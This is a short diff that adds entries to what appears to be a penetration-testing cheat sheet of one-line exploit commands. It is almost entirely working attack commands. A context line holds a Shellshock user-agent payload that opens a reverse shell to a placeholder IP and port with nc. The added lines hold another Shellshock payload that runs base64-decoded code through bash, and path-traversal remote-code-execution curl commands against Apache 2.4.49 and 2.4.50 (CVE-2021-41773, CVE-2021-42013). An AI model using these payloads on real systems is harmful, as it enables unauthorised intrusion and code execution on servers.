@@ -591,6 +591,22 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f'" http://localhost/cgi-bin/something.cgi
 
+#EXAMPLE
+
+curl -H "user-agent: () { :; }; echo; echo; echo {BASE64} | base64 -d | bash" http://localhost/cgi-bin/something.cgi
+
+#EXAMPLE
+
+## Apache 2.4.49 (CVE-2021-41773)
+
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; echo {BASE64} | base64 -d | bash" "http://localhost/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+
+#EXAMPLE
+
+## Apache 2.4.50 (CVE-2021-42013)
+
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; echo {BASE64} | base64 -d | bash" "http://localhost/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
+
 #INDEX
 
 #EXAMPLE
